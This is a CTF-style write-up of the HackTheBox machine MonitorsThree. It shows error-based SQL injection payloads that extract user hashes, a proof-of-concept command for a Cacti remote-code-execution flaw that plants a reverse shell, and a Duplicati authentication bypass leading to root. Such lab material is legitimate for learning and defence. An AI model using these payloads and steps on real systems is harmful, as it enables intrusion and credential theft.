```json
Alias: MonitorsThree
Date: 29-08_2024
Platform: Hackthebox
OS: Linux
Difficulty: Medium
Status: Complete
IP: 10.129.214.153
```

# MonitorsThree
# Summary

- Duplicati is a medium difficulty box, We start by finding a SQL injection in the /forgot-password.php, we use this to get credentials of admin and use them to log in to a vulnerable version of cacti running at `cacti.monitorsthree.htb`. We get a shell as www-data and get access to some sqlite files which contains the server-passphrase for duplicati running at localhost:8200. the Duplicati docker has permission to read and write everything so we leverage that to get root.
 
---

# Information Gathering
## NMAP
```
# Nmap 7.95 scan initiated Thu Aug 29 15:12:30 2024 as: nmap -sC -sV -oA nmapQuick 10.129.214.153
Nmap scan report for 10.129.214.153
Host is up (0.16s latency).
Not shown: 984 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
3/tcp     filtered compressnet
22/tcp    open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp    open     http        nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
545/tcp   filtered ekshell
999/tcp   filtered garcon
1034/tcp  filtered zincite-a
1044/tcp  filtered dcutility
2366/tcp  filtered qip-login
3006/tcp  filtered deslogind
7019/tcp  filtered doceri-ctl
8008/tcp  filtered http
8010/tcp  filtered xmpp
8084/tcp  filtered websnp
9595/tcp  filtered pds
21571/tcp filtered unknown
49400/tcp filtered compaqdiag
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 29 15:13:11 2024 -- 1 IP address (1 host up) scanned in 41.50 seconds
```
## Discovered Subdomains
```
monitorsthree.htb
cacti.monitorsthree.htb
```

---
# Enumeration

The nmap scan shows ssh and http, also a bunch of filtered ports. My assumption is that iptables rules are in place to reject connections to a bunch of ports due to which nmap shows them filtered, there may be something sensitive running or there may not be. We should keep this in mind to look at later and continue.

Enumerating the http port, we find a login page and a forgot password page that is vulnerable to SQLi. Enumerating subdomains also shows us a subdomain that is the web portal to cacti, some kind of graphing tool.

The cacti version is 1.2.26 which is vulnerable to a RCE, but first we need credentials.

So moving on to the SQLi, if we input `'` we get a verbose error message. so we can copy this from portswigger's sqli cheatsheet:

```
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
```

What this attempts to do, is throw an Error with the EXTRACTVALUE function. This is used to extract a value from an XML document. In this case, 1 is passed to EXTRACTVALUE which is not an valid XML document. The second argument expects a valid path, but we are only giving it `\secret`, that's what the concat is doing, just concatenating 0x5c which is `\` to whatever we `SELECT` in this case, `secret`.

So this will throw an error saying that `\secret` is not a valid path. This way we can select what we want, effectively turning this into a non-blind SQLi.

To get the db name:

```
username=a' AND (SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1, 1))))-- -
```

We have to use limit, because we can't pass more than one row to the function. we can try `GROUP_CONCAT` but the error message will be snipped so we will only see the first values

We find the database `monitorsthree_db`

Next get the tables:

```
username=a' AND (SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'monitorsthree_db' LIMIT 0,1))))-- -
```

We find:
- invoices
- customers
- changelog
- tasks
- invoice_tasks
- **users**

Getting columns of the user table:

```
username=a' AND (SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = 'users' LIMIT 0,1))))-- -
```

It contains:
- id
- username
- email
- password
- name
- position
- dob
- start_date
- salary

Let's get the username and password hashes.

Now unfortunately, The limit before the server starts snipping the output is 31, and the hash is 32 characters... This makes me want to do unspeakable stuff, but let's deal with it by using the `SUBSTRING` function to get the last character.

```
username=a' AND (SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT SUBSTRING(password, 32, 32) FROM users LIMIT 0,1))))-- -
```

| Username  | Hash                             |
| --------- | -------------------------------- |
| admin     | 31a181c8372e3afc59dab863430610e8 |
| dthmopson | c585d01f2eb3e6e1073e92023088a3dd |
| janderson | 1e68b6eb86b45f6d92f8f292428f77ac |
| mwatson   | 633b683cc128fe244b00f176c8a950f5 |
The admin MD5 is the only one that cracks.

| Username | Password       |
| -------- | -------------- |
| admin    | greencacti2001 |

Start a listener and:

```bash
./exploit.py http://cacti.monitorsthree.htb/cacti 'admin' 'greencacti2001'
```

---

# Exploitation

With these credentials, let's proceed with the RCE

I'll be using [this](https://github.com/5ma1l/CVE-2024-25641) POC.

The vulnerability lies withing the `import_package()` function in `/lib/import.php`. The function takes XML data, and will blindly accept any file given within the XML data. It then writes these files to a path that we can specify.

```xml
<xml>
   <files>
       <file>
           <name>resource/{}</name>
           <data>{}</data>
           <filesignature>{}</filesignature>
       </file>
   </files>
   <publickey>{}</publickey>
   <signature></signature>
</xml>
```

This is the template that the script uses. The application will write the data in the `<data>` section, to the name in the `<name>` section.

The script by default uses the pentest-monkey reverse shell included in the php folder. Make sure to modify the IP and Port.



---
# Privilege Escalation

## Gaining Access to Duplicati
the `/opt` Directory contains a duplicati docker-compose which has a config at `/opt/duplicate/config`. Let's get the Duplicati-server.sqlite file by placing it in /var/www/html, and then we can simply get it from http://cacti.monitorsthree.htb/Duplicati-server.sqlite.

The server is running at localhost:8200, we will have to use chisel or something else and do some port tunneling to access it.

The database contains the server-passphrase entry in the Option table. [This](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) article explains how we can bypass the authentication using the passphrase we found.

tldr; Generate the password nonce through this:

```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('5cL8Yki1PS5/DLP8avcVwB6JWmO90hYtqXUUDFcHhHQ=') + '661079bc0fb5b8275ed86a33XXXXXXXXXXXXXXXXXXXXXXX')).toString(CryptoJS.enc.Base64);
```

Where the first value is the nonce returned by the server, and the second value is the hex of the passphrase.

Intercept the authentication request -> Right Click -> Do Intercept -> Response to this request.

Get the nonce from the response, and forward it. In the next request when we send the password, replace the value in the password field with the value returned by above function then url encode it. Finally send the request to log in.

## Duplicati to Root

With duplicate, we can create backups and restore them. So, edit the existing configuration that backs up the cacti subdomain, because for some reason it wouldn't create new backups when I tried.

I first backed up marcus' home directory, and I thought this was rather a long process to user, but guess what? It wasn't just to user, I realized I could also backup the /root directory.

This way, backing up the home directories of both we can get the flags but what's the fun in that. Marcus had his id_rsa, but the root didn't. So how to get shell as root?

We could take Marcus' id_rsa.pub, save a copy of it as authorized_keys and backup the home of Marcus again. Next, simply restore the backup of the authorized_keys to `/source/root/.ssh/`. Then, get shell as root while logged in as Marcus by:

`ssh root@localhost`

---

# Flags
- 16a8c73306647f5efdc24c19610082e3
- 9e59f5c0806b57e23d9b11cef1688127

#CTF #CTF/Hackthebox #CTF/Hackthebox/Medium #Linux #WebApp #WebApp/Cacti #SQLi #SQLi/MySQL #Duplicati